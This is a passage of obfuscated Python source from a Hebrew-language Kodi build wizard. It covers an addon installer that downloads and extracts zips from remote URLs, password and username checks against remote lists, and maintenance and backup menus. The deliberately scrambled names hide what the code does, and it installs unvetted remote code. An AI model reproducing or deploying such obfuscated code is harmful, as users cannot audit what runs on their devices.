							OO0O0O0O00O0OOO00 =xbmcaddon .Addon (id =O00OOO0O000OO0OO0 ).getAddonInfo ('path')#line:2499
							if os .path .exists (OO0O0O0O00O0OOO00 ):#line:2500
								OOOOOO00OOO0O00OO ="[COLOR green][Installed][/COLOR] %s"%OOOOOO00OOO0O00OO #line:2501
						except :#line:2502
							pass #line:2503
						O000OOOOO0O00000O +=1 #line:2504
						addFile (OOOOOO00OOO0O00OO ,'addoninstall',O00OOO0O000OO0OO0 ,O00000O0OO0OOOO00 ,description =O00OO00O0O00O0OOO ,icon =OOO00O0O0O00O0000 ,fanart =OOO00000O00OOOO0O ,themeit =THEME2 )#line:2505
					if O000OOOOO0O00000O <1 :#line:2506
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2507
			else :#line:2508
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2509
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2510
		else :#line:2511
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2512
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2513
			addFile ('%s'%OOO00OOOO0OO0O00O ,'',themeit =THEME3 )#line:2514
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2515
	setView ('files','viewType')#line:2516
def addonInstaller (O0O0OOO000OO00OO0 ,OO00OO0OO000000OO ):#line:2518
	if not ADDONFILE =='http://':#line:2519
		OO0OO0OOOO0OO000O =wiz .workingURL (OO00OO0OO000000OO )#line:2520
		if OO0OO0OOOO0OO000O ==True :#line:2521
			OO00OOO0O0O00OOO0 =wiz .openURL (OO00OO0OO000000OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2522
			O0OOOO0OO0OO00OO0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O0OOO000OO00OO0 ).findall (OO00OOO0O0O00OOO0 )#line:2523
			if len (O0OOOO0OO0OO00OO0 )>0 :#line:2524
				for O0000O0000O0OOO00 ,OO00OO0OO000000OO ,O00OO0O0OOOOOO00O ,O0OO000OOO0O00000 ,OOO00O0O000000OO0 ,OOO0O000O00000O00 ,O0000O00OOOO000O0 ,O0O0O00O00OO0000O ,OO0OO0O0OO00000OO in O0OOOO0OO0OO00OO0 :#line:2525
					if os .path .exists (os .path .join (ADDONS ,O0O0OOO000OO00OO0 )):#line:2526
						OO000OOOO0OO0OO00 =['Launch Addon','Remove Addon']#line:2527
						O000OOO0O00OOO000 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO000OOOO0OO0OO00 )#line:2528
						if O000OOO0O00OOO000 ==0 :#line:2529
							wiz .ebi ('RunAddon(%s)'%O0O0OOO000OO00OO0 )#line:2530
							xbmc .sleep (1000 )#line:2531
							return True #line:2532
						elif O000OOO0O00OOO000 ==1 :#line:2533
							wiz .cleanHouse (os .path .join (ADDONS ,O0O0OOO000OO00OO0 ))#line:2534
							try :wiz .removeFolder (os .path .join (ADDONS ,O0O0OOO000OO00OO0 ))#line:2535
							except :pass #line:2536
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0O0OOO000OO00OO0 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2537
								removeAddonData (O0O0OOO000OO00OO0 )#line:2538
							wiz .refresh ()#line:2539
							return True #line:2540
						else :#line:2541
							return False #line:2542
					O0000000O0000OO0O =os .path .join (ADDONS ,O00OO0O0OOOOOO00O )#line:2543
					if not O00OO0O0OOOOOO00O .lower ()=='none'and not os .path .exists (O0000000O0000OO0O ):#line:2544
						wiz .log ("Repository not installed, installing it")#line:2545
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0O0OOO000OO00OO0 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00OO0O0OOOOOO00O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2546
							OO0O0OO0O0O0OO0O0 =wiz .parseDOM (wiz .openURL (O0OO000OOO0O00000 ),'addon',ret ='version',attrs ={'id':O00OO0O0OOOOOO00O })#line:2547
							if len (OO0O0OO0O0O0OO0O0 )>0 :#line:2548
								OO0OOO000OOOOO0O0 ='%s%s-%s.zip'%(OOO00O0O000000OO0 ,O00OO0O0OOOOOO00O ,OO0O0OO0O0O0OO0O0 [0 ])#line:2549
								wiz .log (OO0OOO000OOOOO0O0 )#line:2550
								if KODIV >=17 :wiz .addonDatabase (O00OO0O0OOOOOO00O ,1 )#line:2551
								installAddon (O00OO0O0OOOOOO00O ,OO0OOO000OOOOO0O0 )#line:2552
								wiz .ebi ('UpdateAddonRepos()')#line:2553
								wiz .log ("Installing Addon from Kodi")#line:2555
								O0O000OO0OOOO00OO =installFromKodi (O0O0OOO000OO00OO0 )#line:2556
								wiz .log ("Install from Kodi: %s"%O0O000OO0OOOO00OO )#line:2557
								if O0O000OO0OOOO00OO :#line:2558
									wiz .refresh ()#line:2559
									return True #line:2560
							else :#line:2561
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00OO0O0OOOOOO00O )#line:2562
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0O0OOO000OO00OO0 ,O00OO0O0OOOOOO00O ))#line:2563
					elif O00OO0O0OOOOOO00O .lower ()=='none':#line:2564
						wiz .log ("No repository, installing addon")#line:2565
						O0OO0O0OOOOO0OOOO =O0O0OOO000OO00OO0 #line:2566
						O0OO00000O0OOO0OO =OO00OO0OO000000OO #line:2567
						installAddon (O0O0OOO000OO00OO0 ,OO00OO0OO000000OO )#line:2568
						wiz .refresh ()#line:2569
						return True #line:2570
					else :#line:2571
						wiz .log ("Repository installed, installing addon")#line:2572
						O0O000OO0OOOO00OO =installFromKodi (O0O0OOO000OO00OO0 ,False )#line:2573
						if O0O000OO0OOOO00OO :#line:2574
							wiz .refresh ()#line:2575
							return True #line:2576
					if os .path .exists (os .path .join (ADDONS ,O0O0OOO000OO00OO0 )):return True #line:2577
					O0OOO0O0O0O00OO00 =wiz .parseDOM (wiz .openURL (O0OO000OOO0O00000 ),'addon',ret ='version',attrs ={'id':O0O0OOO000OO00OO0 })#line:2578
					if len (O0OOO0O0O0O00OO00 )>0 :#line:2579
						OO00OO0OO000000OO ="%s%s-%s.zip"%(OO00OO0OO000000OO ,O0O0OOO000OO00OO0 ,O0OOO0O0O0O00OO00 [0 ])#line:2580
						wiz .log (str (OO00OO0OO000000OO ))#line:2581
						if KODIV >=17 :wiz .addonDatabase (O0O0OOO000OO00OO0 ,1 )#line:2582
						installAddon (O0O0OOO000OO00OO0 ,OO00OO0OO000000OO )#line:2583
						wiz .refresh ()#line:2584
					else :#line:2585
						wiz .log ("no match");return False #line:2586
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2587
		else :wiz .log ("[Addon Installer] Text File: %s"%OO0OO0OOOO0OO000O )#line:2588
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2589
def installFromKodi (OO00O0OO0O0OOOOO0 ,over =True ):#line:2591
	if over ==True :#line:2592
		xbmc .sleep (2000 )#line:2593
	wiz .ebi ('RunPlugin(plugin://%s)'%OO00O0OO0O0OOOOO0 )#line:2595
	if not wiz .whileWindow ('yesnodialog'):#line:2596
		return False #line:2597
	xbmc .sleep (1000 )#line:2598
	if wiz .whileWindow ('okdialog'):#line:2599
		return False #line:2600
	wiz .whileWindow ('progressdialog')#line:2601
	if os .path .exists (os .path .join (ADDONS ,OO00O0OO0O0OOOOO0 )):return True #line:2602
	else :return False #line:2603
def installAddon (OO0O00OO0O0O00OOO ,O0000000O0000OOOO ):#line:2605
	if not wiz .workingURL (O0000000O0000OOOO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO0O00OO0O0O00OOO ,COLOR2 ));return #line:2606
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2607
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O00OO0O0O00OOO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2608
	OOOOOO0O0O00O0OOO =O0000000O0000OOOO .split ('/')#line:2609
	OO0O0O00OO0000OO0 =os .path .join (PACKAGES ,OOOOOO0O0O00O0OOO [-1 ])#line:2610
	try :os .remove (OO0O0O00OO0000OO0 )#line:2611
	except :pass #line:2612
	downloader .download (O0000000O0000OOOO ,OO0O0O00OO0000OO0 ,DP )#line:2613
	OO0OO00OOO00O0OOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O00OO0O0O00OOO )#line:2614
	DP .update (0 ,OO0OO00OOO00O0OOO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2615
	OOOOO00OO0O000O0O ,OO0O0O00OOOOOO00O ,OOO000O0OOO000O00 =extract .all (OO0O0O00OO0000OO0 ,ADDONS ,DP ,title =OO0OO00OOO00O0OOO )#line:2616
	DP .update (0 ,OO0OO00OOO00O0OOO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2617
	installed (OO0O00OO0O0O00OOO )#line:2618
	installDep (OO0O00OO0O0O00OOO ,DP )#line:2619
	DP .close ()#line:2620
	wiz .ebi ('UpdateAddonRepos()')#line:2621
	wiz .ebi ('UpdateLocalAddons()')#line:2622
	wiz .refresh ()#line:2623
def installDep (OOO000O0O00O00OO0 ,DP =None ):#line:2625
	OOOOO0OO00O0000O0 =os .path .join (ADDONS ,OOO000O0O00O00OO0 ,'addon.xml')#line:2626
	if os .path .exists (OOOOO0OO00O0000O0 ):#line:2627
		O0O000O00OO000000 =open (OOOOO0OO00O0000O0 ,mode ='r');O00OO0O0O00O0O000 =O0O000O00OO000000 .read ();O0O000O00OO000000 .close ();#line:2628
		O00O00000OO000OOO =wiz .parseDOM (O00OO0O0O00O0O000 ,'import',ret ='addon')#line:2629
		for OO0O0OO0000O00OO0 in O00O00000OO000OOO :#line:2630
			if not 'xbmc.python'in OO0O0OO0000O00OO0 :#line:2631
				if not DP ==None :#line:2632
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0OO0000O00OO0 ))#line:2633
				wiz .createTemp (OO0O0OO0000O00OO0 )#line:2634
def installed (OOO00O0OO00000O00 ):#line:2661
	O00O000O0000000OO =os .path .join (ADDONS ,OOO00O0OO00000O00 ,'addon.xml')#line:2662
	if os .path .exists (O00O000O0000000OO ):#line:2663
		try :#line:2664
			OOOO00OO00O00OO0O =open (O00O000O0000000OO ,mode ='r');OO00O00O00OOOOO00 =OOOO00OO00O00OO0O .read ();OOOO00OO00O00OO0O .close ()#line:2665
			OOO0OO0O0O0O0O000 =wiz .parseDOM (OO00O00O00OOOOO00 ,'addon',ret ='name',attrs ={'id':OOO00O0OO00000O00 })#line:2666
			O00O00O0000OO0OOO =os .path .join (ADDONS ,OOO00O0OO00000O00 ,'icon.png')#line:2667
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OO0O0O0O0O000 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00O00O0000OO0OOO )#line:2668
		except :pass #line:2669
def youtubeMenu (url =None ):#line:2671
	if not YOUTUBEFILE =='http://':#line:2672
		if url ==None :#line:2673
			O00O0OO00OOO000O0 =wiz .workingURL (YOUTUBEFILE )#line:2674
			O0O0OOOOOOOOOO0OO =uservar .YOUTUBEFILE #line:2675
		else :#line:2676
			O00O0OO00OOO000O0 =wiz .workingURL (url )#line:2677
			O0O0OOOOOOOOOO0OO =url #line:2678
		if O00O0OO00OOO000O0 ==True :#line:2679
			O00O00O0OOOOO0OOO =wiz .openURL (O0O0OOOOOOOOOO0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2680
			O0O00O0OOO0O0O0OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00O00O0OOOOO0OOO )#line:2681
			if len (O0O00O0OOO0O0O0OO )>0 :#line:2682
				for O0000O0O0OO00O00O ,OO0O00OOO00OO00OO ,url ,OO00OO00OOO0OO00O ,OOOOO000O000OO0O0 ,OOO0OO00O0O0O00OO in O0O00O0OOO0O0O0OO :#line:2683
					if OO0O00OOO00OO00OO .lower ()=="yes":#line:2684
						addDir ("[B]%s[/B]"%O0000O0O0OO00O00O ,'youtube',url ,description =OOO0OO00O0O0O00OO ,icon =OO00OO00OOO0OO00O ,fanart =OOOOO000O000OO0O0 ,themeit =THEME3 )#line:2685
					else :#line:2686
						addFile (O0000O0O0OO00O00O ,'viewVideo',url =url ,description =OOO0OO00O0O0O00OO ,icon =OO00OO00OOO0OO00O ,fanart =OOOOO000O000OO0O0 ,themeit =THEME2 )#line:2687
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2688
		else :#line:2689
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2690
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2691
			addFile ('%s'%O00O0OO00OOO000O0 ,'',themeit =THEME3 )#line:2692
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2693
	setView ('files','viewType')#line:2694
def STARTP ():#line:2695
	OO00OO0O00000OOOO =(ADDON .getSetting ("pass"))#line:2696
	if BUILDNAME =="":#line:2697
	 if not NOTIFY =='true':#line:2698
          O00000OOO0O0O0O0O =wiz .workingURL (NOTIFICATION )#line:2699
	 if not NOTIFY2 =='true':#line:2700
          O00000OOO0O0O0O0O =wiz .workingURL (NOTIFICATION2 )#line:2701
	 if not NOTIFY3 =='true':#line:2702
          O00000OOO0O0O0O0O =wiz .workingURL (NOTIFICATION3 )#line:2703
	OOO0000OO00000O00 =OO00OO0O00000OOOO #line:2704
	O00000OOO0O0O0O0O =urllib2 .Request (SPEED )#line:2705
	OO0OO0O0O00OO0OOO =urllib2 .urlopen (O00000OOO0O0O0O0O )#line:2706
	O0O00O0O0O0O0OOO0 =OO0OO0O0O00OO0OOO .readlines ()#line:2708
	O00000O00O00O0O00 =0 #line:2712
	for OO00OO0OO0OO0OO00 in O0O00O0O0O0O0OOO0 :#line:2713
		if OO00OO0OO0OO0OO00 .split (' ==')[0 ]==OO00OO0O00000OOOO or OO00OO0OO0OO0OO00 .split ()[0 ]==OO00OO0O00000OOOO :#line:2714
			O00000O00O00O0O00 =1 #line:2715
			break #line:2716
	if O00000O00O00O0O00 ==0 :#line:2717
					OOO00O000O00000O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2718
					if OOO00O000O00000O0 :#line:2720
						ADDON .openSettings ()#line:2722
						sys .exit ()#line:2724
					else :#line:2725
						sys .exit ()#line:2726
	return 'ok'#line:2730
def STARTP2 ():#line:2731
	OO00OO0O0OO0O0000 =(ADDON .getSetting ("user"))#line:2732
	O0O0O000000OOO00O =(UNAME )#line:2734
	OO0OO00OO000OOOO0 =urllib2 .urlopen (O0O0O000000OOO00O )#line:2735
	O00O0OOO0O000O0O0 =OO0OO00OO000OOOO0 .readlines ()#line:2736
	O000OO0000OO000OO =0 #line:2737
	for OO0O000O00000OOO0 in O00O0OOO0O000O0O0 :#line:2740
		if OO0O000O00000OOO0 .split (' ==')[0 ]==OO00OO0O0OO0O0000 or OO0O000O00000OOO0 .split ()[0 ]==OO00OO0O0OO0O0000 :#line:2741
			O000OO0000OO000OO =1 #line:2742
			break #line:2743
	if O000OO0000OO000OO ==0 :#line:2744
		O0O00OO00O0000O00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2745
		if O0O00OO00O0000O00 :#line:2747
			ADDON .openSettings ()#line:2749
			sys .exit ()#line:2752
		else :#line:2753
			sys .exit ()#line:2754
	return 'ok'#line:2758
def passandpin ():#line:2759
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2760
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2761
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2762
def passandUsername ():#line:2763
	ADDON .openSettings ()#line:2764
def folderback ():#line:2767
    OOOO0O00OO0O0O000 =ADDON .getSetting ("path")#line:2768
    if OOOO0O00OO0O0O000 :#line:2769
      OOOO0O00OO0O0O000 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2770
      ADDON .setSetting ("path",OOOO0O00OO0O0O000 )#line:2771
def backmyupbuild ():#line:2774
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2778
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2782
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2783
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2784
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2786
def maintMenu (view =None ):#line:2790
	OOOO0O0OOO0OO0000 ='[B][COLOR green]ON[/COLOR][/B]';OOO000O00OOO000OO ='[B][COLOR red]OFF[/COLOR][/B]'#line:2792
	OO0O0OO00000OO0OO ='true'if AUTOCLEANUP =='true'else 'false'#line:2793
	O000OO00OO0OOOO00 ='true'if AUTOCACHE =='true'else 'false'#line:2794
	O0OOO0000OOO000OO ='true'if AUTOPACKAGES =='true'else 'false'#line:2795
	OO000OOOO0O0O000O ='true'if AUTOTHUMBS =='true'else 'false'#line:2796
	OOO0OOOO0OOO00O00 ='true'if SHOWMAINT =='true'else 'false'#line:2797
	O0000000000000OO0 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2798
	O0OO0O0OO00OO0O00 ='true'if INCLUDEALL =='true'else 'false'#line:2799
	O0OOO0O0O00O0O00O ='true'if THIRDPARTY =='true'else 'false'#line:2800
	if wiz .Grab_Log (True )==False :O0O0O00OOOOOOOOOO =0 #line:2801
	else :O0O0O00OOOOOOOOOO =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2802
	if wiz .Grab_Log (True ,True )==False :O0O000OOO0OOO0OO0 =0 #line:2803
	else :O0O000OOO0OOO0OO0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2804
	OO00O0OOOO0O00O00 =int (O0O0O00OOOOOOOOOO )+int (O0O000OOO0OOO0OO0 )#line:2805
	O0O0OO0O0OOO0O0OO =str (OO00O0OOOO0O00O00 )+' Error(s) Found'if OO00O0OOOO0O00O00 >0 else 'None Found'#line:2806
	O000000OO0000O0O0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2807
	if O0OO0O0OO00OO0O00 =='true':#line:2808
		OOO0000O0OO0OOOOO ='true'#line:2809
		OOOO0O00O0O00O0O0 ='true'#line:2810
		OOO0OO00O0O0OOO00 ='true'#line:2811
		O0OO0O0000O0OOO0O ='true'#line:2812
		OOO00O00O00OOOOOO ='true'#line:2813
		OOOO0O00O0OO000OO ='true'#line:2814
		O0O0O00000O00O00O ='true'#line:2815
		OO0OO000O000OOOOO ='true'#line:2816
	else :#line:2817
		OOO0000O0OO0OOOOO ='true'if INCLUDEBOB =='true'else 'false'#line:2818
		OOOO0O00O0O00O0O0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2819
		OOO0OO00O0O0OOO00 ='true'if INCLUDESPECTO =='true'else 'false'#line:2820
		O0OO0O0000O0OOO0O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2821
		OOO00O00O00OOOOOO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2822
		OOOO0O00O0OO000OO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2823
		O0O0O00000O00O00O ='true'if INCLUDESALTS =='true'else 'false'#line:2824
		OO0OO000O000OOOOO ='true'if INCLUDESALTSHD =='true'else 'false'#line:2825
	OOO0O00000OOOO00O =wiz .getSize (PACKAGES )#line:2826
	O0O0O0OO00OO00OOO =wiz .getSize (THUMBS )#line:2827
	OO00OOO00O000OOO0 =wiz .getCacheSize ()#line:2828
	OOO0000O0OOO00OO0 =OOO0O00000OOOO00O +O0O0O0OO00OO00OOO +OO00OOO00O000OOO0 #line:2829
	OO0O0O0O0O00000O0 =['Daily','Always','3 Days','Weekly']#line:2830
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2831
	if view =="clean"or SHOWMAINT =='true':#line:2832
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0000O0OOO00OO0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00OOO00O000OOO0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0O00000OOOO00O ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0O0OO00OO00OOO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2840
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2841
	if view =="addon"or SHOWMAINT =='false':#line:2842
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2849
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2850
	if view =="misc"or SHOWMAINT =='true':#line:2851
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('View Errors in Log: %s'%(O0O0OO0O0OOO0O0OO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Clear Wizard Log File%s'%O000000OO0000O0O0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2860
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2861
	if view =="backup"or SHOWMAINT =='true':#line:2862
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2874
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2875
	if view =="tweaks"or SHOWMAINT =='true':#line:2876
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2877
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2878
		else :#line:2879
			if os .path .exists (ADVANCED ):#line:2880
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2881
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2882
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2889
	addFile ('Show All Maintenance: %s'%OOO0OOOO0OOO00O00 .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2890
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2891
	addFile ('Third Party Wizards: %s'%O0OOO0O0O00O0O00O .replace ('true',OOOO0O0OOO0OO0000 ).replace ('false',OOO000O00OOO000OO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2892
	if O0OOO0O0O00O0O00O =='true':#line:2893
		OO000O00O0O00O00O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2894
		OOO0OOOO0O000OO0O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2895
		OOOOOO0OOO0OO000O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2896
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO000O00O0O00O00O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2897
